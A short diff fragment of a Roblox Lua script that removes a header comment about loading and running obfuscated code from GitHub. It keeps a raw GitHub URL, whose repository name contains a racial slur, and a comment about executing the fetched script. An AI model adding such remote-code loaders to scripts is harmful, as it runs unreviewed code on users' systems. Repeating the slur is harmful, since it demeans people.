@@ -1,4 +1,3 @@
--- Roblox Lua Script to load and execute obfuscated code from GitHub
 local url = "https://raw.githubusercontent.com/jinglerniggler/sigmaniga2/refs/heads/main/baba"
 
 -- Function to load and execute the script
